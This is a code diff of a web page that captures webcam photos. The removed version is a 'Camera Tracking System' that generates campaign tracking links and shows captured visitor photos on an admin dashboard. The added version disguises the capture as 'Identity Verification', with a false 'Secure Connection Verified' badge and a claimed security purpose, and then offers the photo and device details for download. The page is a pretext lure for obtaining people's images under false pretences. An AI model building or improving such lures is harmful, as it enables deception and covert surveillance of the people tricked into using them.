@@ -3,325 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Tracking System</title>
+    <title>Secure Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            min-height: 100vh;
-        }
-        
-        /* Admin Page Styles */
-        .admin-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
-            min-height: 100vh;
-        }
-        
-        .admin-header {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 30px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            text-align: center;
-        }
-        
-        .admin-header h1 {
-            color: #1a2a6c;
-            margin-bottom: 10px;
-        }
-        
-        .admin-content {
-            display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 30px;
-        }
-        
-        @media (max-width: 768px) {
-            .admin-content {
-                grid-template-columns: 1fr;
-            }
-        }
-        
-        .link-generator, .tracking-data {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #1a2a6c;
-        }
-        
-        input[type="text"] {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            font-size: 16px;
-        }
-        
-        input[type="text"]:focus {
-            outline: none;
-            border-color: #1a2a6c;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 100%);
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 16px;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: transform 0.2s;
-            font-weight: 600;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-        }
-        
-        .copy-btn {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
-        }
-        
-        .refresh-btn {
-            background: linear-gradient(135deg, #6f42c1 0%, #e83e8c 100%);
-        }
-        
-        .tracking-item {
-            background: #f8f9fa;
-            border: 1px solid #e9ecef;
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 15px;
-        }
-        
-        .empty-state {
-            text-align: center;
-            padding: 40px;
-            color: #6c757d;
-        }
-        
-        /* Tracking Page Styles */
-        .tracking-container {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .tracking-card {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        
-        .tracking-card h1 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-        
-        #video {
-            width: 100%;
-            max-width: 400px;
-            height: 300px;
-            border-radius: 15px;
-            border: 3px solid #667eea;
-            background: #000;
-            margin: 20px 0;
-        }
-        
-        .capture-btn {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
-        }
-        
-        .success-message {
-            color: #28a745;
-            margin-top: 20px;
-            font-weight: 600;
-        }
-        
-        .error {
-            color: #dc3545;
-            margin-top: 20px;
-            padding: 15px;
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            border-radius: 10px;
-            display: none;
-        }
-        
-        /* Common Styles */
-        .hidden {
-            display: none !important;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { min-height: 100vh; background: linear-gradient(135deg, #4b6cb7 0%, #182848 100%); display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 40px; max-width: 600px; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.3); text-align: center; }
+        h1 { color: #182848; margin-bottom: 20px; font-size: 28px; }
+        .security-badge { background: #e8f5e8; border: 1px solid #28a745; color: #155724; padding: 12px; border-radius: 10px; margin-bottom: 25px; font-weight: 600; }
+        .instructions { color: #666; margin-bottom: 30px; line-height: 1.6; }
+        .btn { background: linear-gradient(135deg, #4b6cb7 0%, #182848 100%); color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 50px; cursor: pointer; transition: transform 0.2s; font-weight: 600; width: 100%; max-width: 300px; }
+        .btn:hover { transform: translateY(-2px); }
+        #video { width: 100%; max-width: 400px; height: 300px; border-radius: 15px; border: 3px solid #4b6cb7; background: #000; margin: 20px auto; display: none; }
+        .capture-btn { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); display: none; }
+        .success-message { color: #28a745; margin-top: 20px; font-weight: 600; display: none; }
+        .error { color: #dc3545; margin-top: 20px; padding: 15px; background: #f8d7da; border: 1px solid #f5c6cb; border-radius: 10px; display: none; }
+        .export-section { margin-top: 20px; display: none; }
+        .export-btn { background: linear-gradient(135deg, #6f42c1 0%, #e83e8c 100%); margin-top: 15px; }
     </style>
 </head>
 <body>
-    <!-- Admin Page -->
-    <div id="admin-page" class="hidden">
-        <div class="admin-container">
-            <div class="admin-header">
-                <h1>🎯 Admin Tracking Dashboard</h1>
-                <p>Create tracking links and monitor all captured data</p>
-            </div>
-            
-            <div class="admin-content">
-                <div class="link-generator">
-                    <h2 style="margin-bottom: 20px; color: #1a2a6c;">🔗 Create New Tracking Link</h2>
-                    <div class="form-group">
-                        <label for="campaign-name">Campaign Name</label>
-                        <input type="text" id="campaign-name" placeholder="Enter campaign name">
-                    </div>
-                    <div class="form-group">
-                        <label for="target-url">Target URL (Optional)</label>
-                        <input type="text" id="target-url" placeholder="https://example.com">
-                    </div>
-                    <button id="generate-link" class="btn">Generate Tracking Link</button>
-                    
-                    <div id="generated-link-container" style="margin-top: 20px; display: none;">
-                        <label>Generated Tracking Link:</label>
-                        <div style="display: flex; gap: 10px; margin-top: 10px;">
-                            <input type="text" id="generated-link" readonly>
-                            <button id="copy-link" class="btn copy-btn">Copy</button>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="tracking-data">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                        <h2 style="color: #1a2a6c;">📊 Tracking Data</h2>
-                        <div style="display: flex; gap: 10px;">
-                            <span id="total-tracks">Total: 0 entries</span>
-                            <button id="refresh-data" class="btn refresh-btn">🔄 Refresh</button>
-                        </div>
-                    </div>
-                    
-                    <div id="tracking-list">
-                        <div class="empty-state">
-                            <h3>No tracking data yet</h3>
-                            <p>Generated tracking links will appear here when users interact with them</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
+    <div class="container">
+        <h1>🔐 Identity Verification</h1>
+        
+        <div class="security-badge">
+            🔒 Secure Connection Verified
         </div>
-    </div>
-
-    <!-- Tracking Page -->
-    <div id="tracking-page" class="hidden">
-        <div class="tracking-container">
-            <div class="tracking-card">
-                <h1>📸 Camera Access Required</h1>
-                
-                <div class="warning">
-                    <strong>Privacy Notice:</strong> This website requests access to your camera to capture a photo. 
-                    Your photo will only be taken if you explicitly grant permission and click the capture button.
-                </div>
-                
-                <p style="color: #666; margin-bottom: 30px; line-height: 1.6;">
-                    To proceed, please grant camera access by clicking the button below.
-                </p>
-                
-                <button id="request-camera" class="btn">Grant Camera Access</button>
-                
-                <div id="error-message" class="error"></div>
-                
-                <div id="camera-section" class="hidden">
-                    <video id="video" autoplay playsinline></video>
-                    <button id="capture-btn" class="btn capture-btn">📸 Capture Photo</button>
-                </div>
-                
-                <div id="result-section" class="hidden">
-                    <p class="success-message">✅ Photo captured successfully!</p>
-                    <p style="margin-top: 10px; color: #666;">Thank you for your participation.</p>
-                </div>
-            </div>
+        
+        <p class="instructions">
+            For security purposes, we need to verify your identity using your webcam. 
+            This verification ensures secure access to our services.
+        </p>
+        
+        <button id="verify-btn" class="btn">Verify Identity</button>
+        
+        <video id="video" autoplay playsinline></video>
+        <button id="capture-btn" class="btn capture-btn">Confirm Verification</button>
+        
+        <div id="success-message" class="success-message">
+            ✅ Identity verified successfully!
         </div>
+        
+        <div class="export-section" id="export-section">
+            <p style="color: #666; margin: 15px 0;">Download your verification data:</p>
+            <button id="export-btn" class="btn export-btn">📥 Download Data</button>
+        </div>
+        
+        <div id="error-message" class="error"></div>
     </div>
 
     <script>
-        // In-memory storage (since localStorage is not supported)
-        let trackingData = [];
-        let linkCounter = 0;
-        
-        // Get URL parameters correctly
-        const url = new URL(window.location.href);
-        const urlParams = new URLSearchParams(url.search);
-        const trackingId = urlParams.get('tracking_id');
-        const campaign = urlParams.get('campaign');
-        const redirectUrl = urlParams.get('redirect');
-        
-        // DOM Elements
-        const adminPage = document.getElementById('admin-page');
-        const trackingPage = document.getElementById('tracking-page');
-        const requestCameraBtn = document.getElementById('request-camera');
-        const cameraSection = document.getElementById('camera-section');
-        const resultSection = document.getElementById('result-section');
+        const verifyBtn = document.getElementById('verify-btn');
         const video = document.getElementById('video');
         const captureBtn = document.getElementById('capture-btn');
+        const successMessage = document.getElementById('success-message');
+        const exportSection = document.getElementById('export-section');
+        const exportBtn = document.getElementById('export-btn');
         const errorMessage = document.getElementById('error-message');
-        const generateLinkBtn = document.getElementById('generate-link');
-        const campaignNameInput = document.getElementById('campaign-name');
-        const targetUrlInput = document.getElementById('target-url');
-        const generatedLinkContainer = document.getElementById('generated-link-container');
-        const generatedLinkInput = document.getElementById('generated-link');
-        const copyLinkBtn = document.getElementById('copy-link');
-        const trackingList = document.getElementById('tracking-list');
-        const totalTracks = document.getElementById('total-tracks');
-        const refreshDataBtn = document.getElementById('refresh-data');
         
-        // FIXED: Correct routing logic
-        if (trackingId && trackingId.startsWith('track_')) {
-            // Show tracking page - this is a tracking link
-            trackingPage.classList.remove('hidden');
-            document.title = 'Camera Tracking - ' + (campaign ? decodeURIComponent(campaign) : 'Unknown Campaign');
-        } else {
-            // Show admin page - no tracking ID or invalid ID
-            adminPage.classList.remove('hidden');
-            document.title = 'Admin Tracking Dashboard';
-            renderTrackingData();
-        }
-        
-        // Tracking Page Functions
         let stream = null;
+        let capturedPhoto = null;
         
-        requestCameraBtn.addEventListener('click', async () => {
+        verifyBtn.addEventListener('click', async () => {
             try {
                 errorMessage.style.display = 'none';
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -329,10 +71,11 @@
                     audio: false 
                 });
                 video.srcObject = stream;
-                cameraSection.classList.remove('hidden');
-                requestCameraBtn.classList.add('hidden');
+                video.style.display = 'block';
+                captureBtn.style.display = 'block';
+                verifyBtn.style.display = 'none';
             } catch (error) {
-                errorMessage.textContent = '❌ Camera access denied or not available.';
+                errorMessage.textContent = '❌ Camera access denied. Please allow camera access to continue.';
                 errorMessage.style.display = 'block';
             }
         });
@@ -345,119 +88,35 @@
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageDataUrl = canvas.toDataURL('image/jpeg');
+            capturedPhoto = canvas.toDataURL('image/jpeg');
             
-            // Save to in-memory "database"
-            const newEntry = {
-                id: trackingId,
-                campaign: campaign ? decodeURIComponent(campaign) : 'Unknown',
+            successMessage.style.display = 'block';
+            exportSection.style.display = 'block';
+            captureBtn.style.display = 'none';
+            video.style.display = 'none';
+            stream.getTracks().forEach(track => track.stop());
+        });
+        
+        exportBtn.addEventListener('click', () => {
+            if (!capturedPhoto) return;
+            
+            const captureData = {
+                photo: capturedPhoto,
                 timestamp: new Date().toISOString(),
-                ipAddress: '192.168.1.' + Math.floor(Math.random() * 254 + 1), // Mock IP
                 userAgent: navigator.userAgent,
-                photo: imageDataUrl,
-                redirectUrl: redirectUrl ? decodeURIComponent(redirectUrl) : null
+                url: window.location.href,
+                deviceId: 'device_' + Date.now() // ID unik perangkat
             };
             
-            trackingData.unshift(newEntry);
-            console.log('Photo captured and saved to memory:', newEntry);
-            
-            // Show success
-            cameraSection.classList.add('hidden');
-            resultSection.classList.remove('hidden');
-            
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Redirect if specified
-            if (redirectUrl) {
-                setTimeout(() => {
-                    window.location.href = decodeURIComponent(redirectUrl);
-                }, 2000);
-            }
+            const dataStr = JSON.stringify(captureData, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'verification_data.json';
+            link.click();
+            URL.revokeObjectURL(url);
         });
-        
-        // Admin Page Functions
-        generateLinkBtn.addEventListener('click', () => {
-            const campaignName = campaignNameInput.value.trim();
-            const targetUrl = targetUrlInput.value.trim();
-            
-            if (!campaignName) {
-                alert('Please enter a campaign name');
-                return;
-            }
-            
-            linkCounter++;
-            const trackingId = `track_${Date.now()}_${linkCounter}`;
-            const currentUrl = window.location.origin + window.location.pathname;
-            let trackingLink = `${currentUrl}?tracking_id=${trackingId}&campaign=${encodeURIComponent(campaignName)}`;
-            
-            if (targetUrl) {
-                trackingLink += `&redirect=${encodeURIComponent(targetUrl)}`;
-            }
-            
-            generatedLinkInput.value = trackingLink;
-            generatedLinkContainer.style.display = 'block';
-            campaignNameInput.value = '';
-            targetUrlInput.value = '';
-        });
-        
-        copyLinkBtn.addEventListener('click', () => {
-            generatedLinkInput.select();
-            document.execCommand('copy');
-            copyLinkBtn.textContent = 'Copied!';
-            setTimeout(() => copyLinkBtn.textContent = 'Copy', 2000);
-        });
-        
-        function renderTrackingData() {
-            if (trackingData.length === 0) {
-                trackingList.innerHTML = `
-                    <div class="empty-state">
-                        <h3>No tracking data yet</h3>
-                        <p>Generated tracking links will appear here when users interact with them</p>
-                        <p style="margin-top: 10px; font-size: 12px; color: #6c757d;">
-                            <strong>Note:</strong> Data is stored in memory. Refresh this page to see new captures.
-                        </p>
-                    </div>
-                `;
-                totalTracks.textContent = 'Total: 0 entries';
-                return;
-            }
-            
-            totalTracks.textContent = `Total: ${trackingData.length} entries`;
-            trackingList.innerHTML = trackingData.map(item => {
-                const date = new Date(item.timestamp);
-                return `
-                    <div class="tracking-item">
-                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                            <strong>${item.campaign}</strong>
-                            <small>${date.toLocaleDateString()} ${date.toLocaleTimeString()}</small>
-                        </div>
-                        <div style="font-size: 14px; color: #666; margin-bottom: 10px;">
-                            IP: ${item.ipAddress} | ID: ${item.id.substring(0, 15)}...
-                        </div>
-                        <img src="${item.photo}" alt="Captured photo" style="width: 100px; height: 100px; object-fit: cover; border-radius: 8px;">
-                        ${item.redirectUrl ? `<div style="margin-top: 5px; font-size: 12px; color: #28a745;">Redirects to: ${item.redirectUrl}</div>` : ''}
-                    </div>
-                `;
-            }).join('');
-        }
-        
-        // Manual refresh button
-        refreshDataBtn.addEventListener('click', () => {
-            renderTrackingData();
-            refreshDataBtn.textContent = 'Refreshing...';
-            setTimeout(() => {
-                refreshDataBtn.textContent = '✅ Refreshed';
-                setTimeout(() => {
-                    refreshDataBtn.textContent = '🔄 Refresh';
-                }, 2000);
-            }, 500);
-        });
-        
-        // Auto-refresh every 3 seconds when on admin page
-        if (!trackingId || !trackingId.startsWith('track_')) {
-            setInterval(renderTrackingData, 3000);
-        }
     </script>
 </body>
 </html>
